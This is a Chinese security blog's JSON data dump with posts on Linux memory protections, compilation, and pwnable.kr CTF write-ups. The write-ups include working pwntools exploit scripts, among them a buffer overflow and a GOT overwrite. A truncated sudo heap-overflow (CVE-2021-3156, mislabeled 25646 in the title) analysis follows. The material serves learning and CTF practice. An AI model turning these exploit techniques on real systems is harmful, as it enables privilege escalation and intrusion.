{"meta":{"title":"Firework","subtitle":"","description":"Less_is_more","author":"Firework","url":"http://example.com","root":"/"},"pages":[{"title":"标签","date":"2021-04-08T07:13:42.902Z","updated":"2021-04-08T07:13:42.893Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-04-08T07:15:38.000Z","updated":"2021-04-08T07:16:14.735Z","comments":true,"path":"link/index.html","permalink":"http://example.com/link/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-04-08T07:14:19.440Z","updated":"2021-04-08T07:14:19.423Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Linux程序保护机制","slug":"Linux程序保护机制","date":"2021-04-17T18:32:31.798Z","updated":"2021-04-17T18:48:23.671Z","comments":true,"path":"2021/04/18/Linux程序保护机制/","link":"","permalink":"http://example.com/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","excerpt":"","text":"Linux程序保护机制​ 在Pwnable.kr刷题的过程中一点一点地了解了linux系统下的一些安全机制来降低程序受到溢出等攻击，这里简单做个总结。:) Tools:checksecchecksec是一个检查linux程序开启的安全机制的shell脚本，也可以检测packer信息 （Demo: 题目:flag 下面对逐个介绍保护机制 CANARY​ 在linux程序中，CANARY是一种栈保护机制，栈保护机制开启后，函数执行时会先往栈中插入随机值，这个随机值就被称为CANARY，当函数返回时，会先验证这个随机数是否被更改，如果被更改说明有栈溢出行为，就会使程序强制停止，从而规避栈溢出带来的危害。 ​ Function： 1、在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数被称作“canary”，用 IDA 反汇编时，又被称作“Security Cookie”。 2、canary 位于 EBP 之前，系统还会在.data 的内存区域中存放一个 canary 的副本。 3、 当栈中发生溢出时，canary 将被首先淹没，之后才是 EBP 和返回地址。 4、 在函数返回之前，系统将执行一个额外的安全验证操作，称作 Security Check。 5、在 Security Check 过程中，系统将比较栈帧中原先存放的 canary 和.data 中副本的值，若两者不同，则说明栈中发生了溢出，系统将进入异常处理流程，函数不会正常返回。 FORTIFYFORTIFY机制用于检查程序是否存在缓冲区溢出错误。这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。适用于memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets等函数。 在函数编译时，加入FORTIFY机制的代码会在编译过程中自动添加一部分代码，判断数组的大小，削减缓冲区溢出的危害。 gcc编译时，默认不开启FORTIFY机制，可通过编译选项选择开启的FORTIFY机制强度 NXNX:no-excute不可执行 基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 PIE（ASLR）PIE一般与ASLR地址分布随机化(address space layout randomization)同时工作 内存地址随机化机制几种情况：1230 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 RELRORELRO:read only relocation 由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读. 作用：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。 Summary了解以上内存保护机制的信息会为我们pwn提供一些信息。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"程序保护机制","slug":"程序保护机制","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"}]},{"title":"Pwnable_game题解","slug":"Pwn","date":"2021-04-14T14:59:55.267Z","updated":"2021-04-18T11:55:17.529Z","comments":true,"path":"2021/04/14/Pwn/","link":"","permalink":"http://example.com/2021/04/14/Pwn/","excerpt":"","text":"Pwnable_games开始刷题啦！冲冲冲！本贴记录主要记录知识点和exp fdTips: main函数的三个参数 int argc int型变量，表示传递给main函数的参数数量。 char *argv 指针数组，每个指针指向各个具体的参数。 char*envp 环境变量，可以为程序运行过程中需要使用环境变量做参考。 Demo: 1$ ./hello //执行该文件 此时argc=1,表示只有一个参数输入 argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello 1$ ./hello para_1 此时argc=2,有两个参数传入 argc[0]指向输入程序路径及名称 “./hello” argv[1]指向para_1字符串 Linux 文件IO部分理解 所有的I/O设备都被模型化为文件，而所有的输入和输出都被当做相应文件的读和写来执行。这种将设备优雅映射为文件的方式，允许Linux内核引出一个简单、低级的应用接口，称为Unix I/O，这使得所有输入和输出都能以一种统一、一致的方式来执行： 打开文件 ： 应用程序通过内核打开相应文件，内核返回一个小的非负整数，叫做描述符，它在后续对此文件的所有操作中标识这个文件。内核记录有关打开文件的所有信息。应用程序只需记住这个描述符。 文件描述符fd： 文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。 Linux shell创建的每个进程开始时都有三个打开的文件： 12345stdin 标准输入的文件标识符为0 stdout 标准输出的文件标识符为1stderr 标准错误输出的文件标识符为2 Exp: 1234567891011#coding=utf-8from pwn import *payload=str(0x1234)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;fd&#x27;,password=&#x27;guest&#x27;,port=2222)#shell.download_file(&#x27;fd.c&#x27;)sh = shell.run(&#x27;./fd&#x27;+&#x27; &#x27;+payload)payload=&quot;LETMEWIN&quot;sh.sendline(payload)sh.interactive() collisionTips: 跟哈希相关不大（× 可能是我没有get到出题人的意思 思路很简单，用hashcode的值除以5，再依次加起来就好了。0x21DD09EC的十进制表示是568134124，它并不能被5整除，所以我们用一个小技巧，先加1，再除以5，最后将其中一个数值再减1即可。 具体计算方法为： 12(568134124 + 1) / 5 = 113626825 = 0x6C5CEC90x21DD09EC = 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC8 那么argv[1]的字符串，就应该是一个由相应十六进制数值组成的字符串，表示如下： 1\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06 这里采用小端存储方式。 小端存储：高字节保存在内存高地址，低字节保存在内存低地址中 这个解释依旧十分笼统，为什么int型数据以小端存储就要每个int型数据逆序输入 下面两张图说明问题：（×其实还并不能说明问题 但是我们并不知道输入的命令行参数在内存存储的增长方向😀 各种Google均无果。。无奈下手动测试一下。 Test Code: 12345678910 #include&lt;stdio.h&gt; int main(int argc,char* argv[],char* env[]) &#123;for(int i=0;i&lt;=2;i++) printf(&quot;argv[%d]:%p\\n&quot;,i,argv[i]); int i=0; printf(&quot;stack:%p\\n&quot;,&amp;i); printf(&quot;env:%p\\n&quot;,env[i]); return 0; &#125; 实践出真知: 输入的argv[1]存储在栈上和内核空间之间，并且由低地址向高地址增长。 那么就很容易明白为什么逆序输入int四个字节了。 以为0x6C5CEC9和0x6C5CEC8为例 我们传入命令行参数argv[1]对应的字节序列为 \\xc9\\xce\\xc5\\x06\\x12\\x34\\x56\\x78实际存储时如下方式存储如下： 高地址8 78高地址7 56高地址6 34高地址5 12高地址4 06高地址3 c5高地址2 ce高地址1 c9 int型号指针ip指向高地址1 那么由于int型号为小端存储，四个字节依次读取 ip[i]=0x06C5CEC9 ip[2]=0x78563412 网上大部分解析只是简单说明int数据小端存储，但是单单知道这个是不足以得出逆序输入的结论，必须知道命令行参数存储结构。 以上内容原创。转载注明出处。 PS：部分字节没有对应ASCII码，我们需要直接向argv[1]中写入字节，可以用python实现 Demo: 1`python -c print &#x27;\\xAB\\xCD&#x27;` Exp: 12345678#coding=utf-8from pwn import *payload=p32(0x6c5cec9)*4+p32(0x6c5cec8)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;col&#x27;,password=&#x27;guest&#x27;,port=2222)sh = shell.run(&#x27;./col&#x27;+&#x27; &#x27;+payload)sh.interactive() bofAnalyse: get简单的溢出 IDA静态查看arg[1]和数组key对应的VA地址，计算出偏移为0x52 Exp: 1234567#coding=utf-8from pwn import *io=remote(&quot;pwnable.kr&quot;,9000)payload=&#x27;a&#x27;*(0x2c+0x8)+p32(0xcafebabe)io.sendline(payload)io.interactive() flagAnalyse: IDA静态分析发现里面内容少得可怜..很明显是加壳了 这里需要用到strings命令，一个技巧可以获得关键的信息： 1strings -20 flag 显示flag文件中至少包含20个字符的字符串，定位关键信息： 1Info: This file is packed with the UPX executable packer http:&#x2F;&#x2F;upx.sf.net Google后简单了解了一下upx ，是个压缩壳 upx -d 解压一下即可 然后字符搜索关键词字 :) #注意此处需要转义字符 1strings flag |grep \\:\\) passcodesouce code: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;//这个条件一旦成立就可以pwn printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;Login Failed!\\n&quot;); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name);&#125;int main()&#123; printf(&quot;Toddler&#x27;s Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0;&#125; key points: scanf函数: scanf(&quot;%d&quot;, passcode1); 缺少一个&amp;这时函数执行时，会将passcode1作为地址进行写入操作，同理对应passcode2一样。一旦这两个不可控的地址是不可写或访问的，那么程序就crash了。 那么对passcode1和2地址的构造，然后利用scanf函数在该地址进行写入数据会是关键。 Analyse： 函数流程分析 welcome:可以在name数组中写入长度位100字节的字符 接下来无缝执行 login： 对passcode1地址上进行写入数据 ➡ 调用fflush(stdin); ➡ 输入passcode2 ➡check为真后输出flag 由于welcome()和login()这两个函数之间执行期间没有其他操作，可以分析得出前后进入这两个栈帧时，他们的EBP是一样的，自然可以想到我们可以领用name数组对passcode1和passcode2进行覆盖。 IDA静态分析： name数组数组的地址为：EBP-70H passcode1地址: EBP-10H passcode2地址: EBP-0cH welcome（）和login（）这两个函数栈帧的EBP一样只是我们的猜测，我们可以用gdb动态调试验证查看是否确实相同。 下载ELF文件： 1234#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)shell.download_file(&quot;./passcode&quot;) 修改权限 1chmod 777 passcode 查看内存保护信息： 1checksec passcode 此处的RELRO信息为关键点，关于checksec 查看内存保护信息参阅这篇： linux内存保护信息 gdb动态调试： 查看验证：确实两个函数栈帧的EBP相同，那么自然想到可以利用name数组对passcode1和2进行覆盖，但是注意到数组name大小是100字节，name首地址到passcode1首地址距离为96，我们组多能利用name数组的最后四个字节覆盖passcode1，无法覆盖到passcode2 注意到输入passcode1后，立即执行了 fflush(stdin) 【用于更新缓冲区】函数，调用这个函数的时候会利用linux的动态延迟加载。 此处需要恶补一下GOT和PLT表的关系以及linux动态延迟加载的一些只是： 参考这篇非常详细 参阅完毕后就可以进行exp Hijack GOT： 修改某个被调用函数的地址，让其指向另一个函数 这里我们修改调用fflush的地址，改为cat flag指令的地址，然后成功执行cat flag指令得到flag。 最后要做的就是找到fflush的地址和cat flag的地址，然后用name数组对passcode1覆盖为fflush的GOT表项地址，然后用scanf函数对GOT表象覆写为输出flag的指令即可。 找到fflush的GOT表项地址: 0x0804a004 找到cat flag 指令地址为：0x080485E3 Exp： 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)sysh_addr=0x080485E3fflush_got=0x0804a004payload=&quot;a&quot;*(100-4)+p32(fflush_got)sh=shell.run(&#x27;./passcode&#x27;)sh.sendlineafter(&quot;enter you name :&quot;,payload)payload=str(sysh_addr)sh.sendlineafter(&quot;enter passcode1 :&quot;,payload)sh.interactive() randominputlegmistakeshellshockcoin1blackjacklottocmd1cmd2uafmemcpyasmunlinkblukathorcruxesbrain fuckmd5 calculatorsimple loginotpascii_easytiny_easyfsbdragonfixsyscallcrypto1echo1echo2rsa_calculatornoteallocaloveletterrootkitdos4funasciiaegcoin2mazewtfsudokustarcraftcmd3elflfhlokihardtasghuntermipstakeunexploitabletinysoftmmutowelrootnuclearmalwareexploitabletiny_hardkcrcexynoscombabo_calculatorpwnsandboxcrcgen","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Linux代码编译过程","slug":"Linux环境下编译过程","date":"2021-04-11T16:05:33.539Z","updated":"2021-04-11T16:05:11.515Z","comments":true,"path":"2021/04/12/Linux环境下编译过程/","link":"","permalink":"http://example.com/2021/04/12/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/","excerpt":"","text":"Linux下Hello World的前生今世代码引入hello.c 1234567#include &lt;stdio.h&gt;int main(int argc,char *argv[],char *envp[])&#123; printf(&quot;Hello World\\n&quot;); return 0;&#125; linux环境下我们可以通过GCC编译hello.c: 1$ gcc -g hello.c -o hello 当前目录先会生成hello可执行文件。 main函数的三个参数int argc int型变量，表示传递给main函数的参数数量。 char *argv 指针数组，每个指针指向各个具体的参数。 char*envp 环境变量，可以为程序运行过程中需要使用环境变量做参考。 Demo: 1$ ./hello //执行该文件 此时argc=1,表示只有一个参数输入 argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello 1$ ./hello para_1 此时argc=2,有两个参数传入 argc[0]指向输入程序路径及名称 “./hello” argv[1]指向para_1字符串 what’s gccGCC是GNU Compiler Collection的缩写，GCC是一系列编译器的集合，是Linux操作系统的核心组件之一。GCC最初名为GNU C Compiler，当时它只是一款C语言的编译器，不过随着后续迭代，它支持C++、Fortran、Go等语言，GCC也因此成为一个编译器集合。GCC有以下特点： GCC支持的编程语言多。比如，g++是C++编译器，gfortran是Fortran编译器。 GCC支持的硬件全。GCC可以将源代码编译成x86_64、ARM、PowerPC等硬件架构平台的可执行文件。 GCC支持众多业界标准。GCC能很快支持最新的C++标准，GCC支持OpenMP、OpenACC。 编译过程分析 预处理预处理器CPP工具进行预处理 1$ cpp hello.c -o hello.i 预编译主要处理源代码中以#开始的预编译指令，主要处理规则如下： 处理#include 预编译指令，将被包含的文件插入到该预编译指令的位置。这是一个递归的过程，如果被包含的文件还包含了其他文件，会递归地完成这个过程。 处理条件预编译指令，比如#if、#ifdef、#elif、#else、#endif。 删除#define，展开所有宏定义。 添加行号和文件名标识，以便于在编译过程中产生编译错误或者调试时都能够生成行号信息。 编译gcc对预处理后的hello.i文件惊醒编译。编译的过程主要是进行词法分析、语法分析、语义分析，这背后涉及编译原理等一些内容。这里只进行编译，不汇编，可以生成硬件平台相关的汇编语言。 1$ gcc -S hello.i -o hello.s 它包含一个汇编语言程序，即将C语言程序编译成汇编语言程序。 汇编1$ as hello.s -o hello.o as工具将hello.s文件翻译为二进制代码。 虽然这个文件已经是二进制的机器码了，但是它仍然不能执行，因为它缺少系统运行所必须的库，比如C语言printf()对应的汇编语言的puts函数。确切的说，系统还不知道puts函数在内存中的具体位置。如果我们在一份源代码中使用了外部的函数或者变量，还需要重要的一步：链接。 链接1$ gcc hello.o -o hello 该命令是基于动态链接的方式，生成的hello已经是一个可执行文件。实际上，这个命令隐藏了很多背后的内容。 main()方法是C语言程序的入口，crt1.o这几个库是在处理main()方法调用之前和程序退出之后的事情，这需要与操作系统协作。在Linux中，一个新的程序都是由父进程调用fork()，生成一个子进程，然后再调用execve()，将可执行文件加载进来，才能被操作系统执行。所以，准确地说，main()方法是这个程序的入口，但仅仅从main()方法开始，并不能顺利执行这个程序。 链接器将多个目标文件合并成一个可执行目标文件，这个二进制文件包含加载程序到内存并运行的所有信息。 链接过程主要包含了两个步骤： 地址与空间分配（Address and Storage Allocation） 这个过程中， 扫描所有的输入目标文件，获得它们的各个节的长度、属性、位置，并将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统一放到一个全局的符号表。这一步，链接器能够获得所有输入目标文件的节的长度，并将它们合并，计算出输出文件中各个节合并后的长度与位置，并建立映射关系。 这里引入可执行目标文件的概念。 .text:已编译程序的机器代码 .rodata:只读数据 .data:已初始化的全局和静态C变量 .bss:未初始化的全局和静态C变量 .symtab: 符号表，存放在程序中定义和引用的函数和全局变量的信息 .debug:调试符号表 可执行文件中的段是由目标文件中的节合并而来的，以下是链接器如何将它们的各个节合并到输出文件，也即输出文件中的空间如何分配给输入文件的两种方式。 顺序叠加 虽然这种方法非常简单，但是它存在一个问题：在有很多输入文件的情况下，输出文件会有很多零散的节。这种做法非常浪费空间，因为每个节都需要有一定的地址和空间对齐要求。x86硬件的对齐要求是4KB。如果一个节的大小只有1个字节，它也要在内存在重用4KB。这样会造成大量内部碎片。所以不是一个好的方案。 合并相似节 一个更加实际的方法便是合并相同性质的节，比如：将所有输入文件的 .text节合并到输出文件的 text段（注意，此时出现了段和节两个概念），如下图所示。 其中.bss节在目标文件和可执行文件中不占用文件的空间，但是它在装载时占用地址空间。事实上，这里的空间和地址有两层含义: 在输出的可执行文件中的空间 在装载后的虚拟地址中的空间 对于有实际数据的节，如.text和.data，它们在文件中和虚拟地址中都要分配空间，因为它们在这两者中都存在；对于.bss来，分配空间的意义只局限于虚拟地址空间，因为它在文件中并没有内容。我们在这里谈到的空间分配只关注于虚拟地址空间（见下图）的分配，因为这关系到链接器后面的关于地址计算的步骤，而可执行文件本身的空间分配与链接的关系并不大。 现在的链接器空间分配的策略基本上都采用“合并相似节”的方法，使用这种方法的链接器一般采用一种叫 两步链接（Two-pass Linking） 的方法。即整个链接过程分为地址与空间分配和符号解析、重定位。 符号解析（Symbol Resolution）和重定位（Relocation） 使用前一步中收集到的所有信息，读取输入文件中节的输数据、重定位信息，并且进行符号解析与重定位、调整代码、调整代码中的地址等。重定位是链接过程的核心。在地址与空间分配步骤完成之后，相似权限的节会被合并成段，并生成了 程序头表（Program Header Table） 结构。如下图可执行文件结构所示，主要生成两个段：代码段（ text段）、数据段（ data段 ）。 符号解析 重定位的过程是伴随着符号解析的，这里先介绍符号解析。 链接器解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。对那些和引用定义在相同模块的局部符号的引用，符号解析是非常简单的。编译器只允许每个模块中每个局部符号有一个定义。静态局部变量也会有本地链接器符号，编译器还要确保它们拥有唯一的名字。 然而，对于全局符号的解析要复杂得多。当编译器遇到一个不是在当前模块中定义的符号（变量或函数名）时，会假设该符号是在其他某个模块中定义的，生成一个链接器符号表条目，并把它交给链接器处理。如果链接器在它的任何输入模块中都找不到这个被引用符号的定义，就输出一条错误信息并终止。 多重定义的全局符号解析在此不做介绍。 重定位 链接的前两步完成之后，链接器就已经确定所有符号的虚拟地址了，那么链接器就可以根据符号的地址对每个需要重定位的指令进行地址修正。 那么链接器如何知道哪些指令是要被调整的呢？事实上，我们前面提到的ELF文件中的 重定位表（Relocation Table） 专门用来保存这些与重定位相关的信息。 对于可重定位的ELF文件来说，它必须包含重定位表，用来描述如何修改相应的节的内容。对于每个要被重定位的ELF节都有一个对应的重定位表。如果.text节需要被重定位，则会有一个相对应叫.rel.text的节保存了代码节的重定位表；如果.data节需要被重定位，则会有一个相对应的.rel.tdata的节保存了数据节的重定位表。 链接可分为静态链接和动态链接 静态链接简单来说，静态链接就是在程序加载前，将所依赖的第三方库函数都打包到了一起，形成一个非常大的可执行文件。如下图所示为最基本的静态链接过程示意图。每个模块的源代码文件（如.c）文件经过编译器编译成目标文件（Object File，一般扩展名为.o或.obj）。目标文件和 库（Library） 一起链接形成最终的可执行文件。其中，最常见的库就是运行时库（Runtime Library），它是支持程序运行的基本函数的集合。库本质上是一组目标文件的包，由一些最常用的代码编译成目标文件后打包而成。 动态链接动态链接是在运行时，发现用到某些库中的某些函数时，再从这些第三方库中读取自己所需的方法。 动态链接的基本实现 动态链接涉及运行时的链接以及多个文件的装载，必需要有操作系统的支持。因为动态链接的情况下，进程的虚拟地址空间的分布会比静态链接情况下更为复杂，还有一些存储管理、内存共享、进程线程等机制在动态链接下也会有一些微妙的变化。 目前，主流操作系统都支持动态链接。在Linux中，ELF动态链接文件被称为 动态共享对象（DSO，Dynamic Shared Objects），一般以.so为后缀；在Windows中，动态链接文件被称为 动态链接库（Dynamic Linking Library），一般以.dll为后缀。 在Linux中，常用的C语言库的运行库glibc，其动态链接形式的版本保留在 /lib目录下，文件名为 libc.so。整个系统只保留一份C语言动态链接文件libc.so，所有的C语言编写的、动态链接的程序都可以在运行时使用它。当程序被装载时，系统的动态链接器会将程序所需要的所有动态链接库装载到进程的地址空间，并将程序中所有未解析的符号绑定到相应的动态链接库中，并进行重定位。 动态链接程序运行时地址空间分布 对于静态链接的可执行文件来说，整个进程只有一个文件要被映射，即可执行文件。而对于动态链接，除了可执行文件，还有它所依赖的共享目标文件。 关于共享目标文件在内存中的地址分配，主要有两种解决方案，分别是： 静态共享库（Static Shared Library）（地址固定） 动态共享库（Dynamic Shared Libary）（地址不固定） 静态共享库 静态共享库的做法是将程序的各个模块统一交给操作系统进行管理，操作系统在某个特定的地址划分出一些地址块，为那些已知的模块预留足够的空间。因为这个地址对于不同的应用程序来说，都是固定的，所以称之为静态。 但是静态共享库的目标地址会导致地址冲突、升级等问题。 动态共享库 采用动态共享库的方式，也称为装载时重定位（Load Time Relocation）。其基本思路是：在链接时，对所有绝对地址的引用都不作重定位，而把这一步推迟到装载时再完成。一旦模块装载地址确定，即目标地址确定，那么系统就对程序中所有的绝对地址引用进行重定位。 但是这种方式也存在一些问题。比如，动态链接模块被装载映射至虚拟空间后，指令部分是在多个进程间共享的，由于装载时重定位的方法需要修改指令，所以没有办法做到同一份指令被多个进程共享，因为指令被重定位后对于每个进程来说都是不同的。 然后，动态链接库中的代码是共享的，但是其中的可修改数据部分对于不同进程来说是由多个副本的。基于此，一种名为地址无关代码的技术被提出以克服这个问题。 与地址无关 无论何种操作系统上，使用动态链接生成的目标文件中凡是涉及第三方库的函数调用都是地址无关的。我们自己编写的程序名为hello.c，hello.c中调用了C标准库的printf()，在生成的目标文件中，不会立即确定printf()的具体地址，而是在运行时去装载这个函数，在装载阶段确定printf()的地址。这里提到的地址指的是进程在内存上的虚拟地址。动态链接库的函数地址在编译时是不确定的，在装载时，装载器根据当前地址空间情况，动态地分配一块虚拟地址空间。 小结在会写一个C程序，也要了解一个C代码是如何从ASCII文件一步步变为可执行文件的过程。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"编译过程","slug":"编译过程","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"链接","slug":"链接","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"}]},{"title":"CVE-2021-25646堆溢出漏洞复现及分析","slug":"CVE-2021-3156","date":"2021-04-10T03:26:10.677Z","updated":"2021-04-10T06:32:38.500Z","comments":true,"path":"2021/04/10/CVE-2021-3156/","link":"","permalink":"http://example.com/2021/04/10/CVE-2021-3156/","excerpt":"","text":"CVE-2021-25646堆溢出漏洞复现及分析漏洞详情​ 当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。 ​ 影响范围： ​ Sudo 1.8.2 - 1.8.31p2 ​ Sudo 1.9.0 - 1.9.5p1 漏洞原理分析​ 对于bash而言假如我们希望执行某个命令可以使用bash -c [command]来执行，如果我们希望以root的权限去执行某个命令的话可以直接sudo [cmd]，而如果我们希望以shell模式去执行某个命令的时候，可以使用sudo -i或者sudo -s参数，在参数说明里我们可以看到-i, --login run login shell as the target user; a command may also be specified， -s, --shell run shell as the target user; a command may also be specified，当我们使用上述参数时对于sudo的flags而言有两种情况： 使用sudo -s，设置MO DE_SHELL 使用sudo -i，设置MODE_SHELL|MODE_LOGIN_SHELL ​ 在src/parse_args.c里我们可以看到对于这种模式的参数处理，处理方式为将参数按照空格拼接起来，对于一些元字符使用反斜线进行转义处理，最终覆写了argv为ac这个指针数组。 ​ 源码分析： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * For shell mode we need to rewrite argv */ if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; char **av, *cmnd = NULL; int ac = 1; if (argc != 0) &#123; /* shell -c &quot;command&quot; */ char *src, *dst; //得到命令的长度 size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) + strlen(argv[argc - 1]) + 1; cmnd = dst = reallocarray(NULL, cmnd_size, 2); if (cmnd == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, cmnd)) exit(1); //拼接命令并且处理转移符 for (av = argv; *av != NULL; av++) &#123; for (src = *av; *src != &#x27;\\0&#x27;; src++) &#123; /* quote potential meta characters */ if (!isalnum((unsigned char)*src) &amp;&amp; *src != &#x27;_&#x27; &amp;&amp; *src != &#x27;-&#x27; &amp;&amp; *src != &#x27;$&#x27;) *dst++ = &#x27;\\\\&#x27;;//处理转义字符，&#x27;\\\\&#x27;表示反斜线 *dst++ = *src; &#125; *dst++ = &#x27; &#x27;; &#125; if (cmnd != dst) dst--; /* replace last space with a NUL */ *dst = &#x27;\\0&#x27;; ac += 2; /* -c cmnd */ &#125; //上述处理完毕后结果保存在dst指针指向的内存 av = reallocarray(NULL, ac + 1, sizeof(char *)); //分配新的内存保存拼接的命令 if (av == NULL) sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); if (!gc_add(GC_PTR, av)) exit(1); av[0] = (char *)user_details.shell; /* plugin may override shell */ if (cmnd != NULL) &#123; av[1] = &quot;-c&quot;; av[2] = cmnd; &#125; av[ac] = NULL; //最后的形式为 shell -c cmnd(shell和环境变量相关，比如我这里是zsh，shell为/usr/bin/zsh) //最终用av覆写argv argv = av; argc = ac; &#125; ​ 随后在sudoers.c中的sudoers_policy_main函数中调用set_cmnd将命令行参数存放在一个堆上的数据结构user_args中，这里也对元字符做了处理，假如不是\\\\+space的形式就跳过元字符，否则拷贝到*to。那么假如我们的命令行参数以\\\\结尾，那么from[0]=&#39;\\\\&#39;;from[1]=NULL(注意NULL并非sapce范围)，此时from++指向空字符，下面将空字符拷贝到了*to并且from++后执行了NULL后面的字符，此时再次进行while循环判断时很明显这里是可以继续进入循环的(如果后一个字符不为NULL)，从而赋值得以继续进行，从而产生了溢出。 1234567891011121314151617if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; /* * When running a command via a shell, the sudo front-end * escapes potential meta chars. We unescape non-spaces * for sudoers matching and logging purposes. */ for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123; while (*from) &#123; if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1])) from++; *to++ = *from++; &#125; *to++ = &#x27; &#x27;; &#125; *--to = &#x27;\\0&#x27;; &#125; set_cmnd()存在越界写，溢出user_args堆缓冲区（size是在852-853行中计算）。根本原因就是，sudo默认 \\ 后面肯定跟着元字符，实际上后面只有1个结束符。 当from指向\\时，from[1]指向NULL字节，from[2]指向的就是环境变量的第一个字节了，执行*too=*from++，可以将后面的NULL字节拷贝到user_args的堆中，且让from++，从而避开了while(*from）判断是否读到NULL字节的检测，由于参数后面紧跟环境变量的值，因此通过设置环境变量的值来覆盖user_args堆后面的数据。 ​ 上述是我们的理论分析，在理论角度上看漏洞是存在的，但是我们在之前的漏洞中也见到过由于无法创造漏洞利用场景(比如我想提权但是exp里需要某个root用户给的capability)，这样的洞就非常鸡肋。那么在我们的分析里有几个理想条件，那么最后的这个场景，即反斜线作为cmd-line的最后一个字符从理论上来说是无法实现的，这里要求我们有MODE_SHELL|MODE_LOGIN_SHELL，而假如flag包含MODE_SHELL的话在我们之前的parse_args参数解析中就会将所有元字符给转义掉，也就是说会有两个反斜线，我们再按照代码走一遍会发现这样循环末尾的*from=NULL，因此会跳出循环。 ​ 再仔细对比一下二者的条件，二者的条件略有不同。我们的问题在于能否设置flag为MODE_SHELL以及MODE_RUN或者MODE_EDIT或者MODE_CHECK。 ​ 再看下解析参数的部分会发现好像还是不太行，假如我们使用-e参数设置MODE_EDIT或者使用-l参数设置MODE_CHECK，我们的MODE_SHELL参数就会被从valid_flags去掉。 12345678910//bug conditionif (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; //... if (ISSET(sudo_mode, 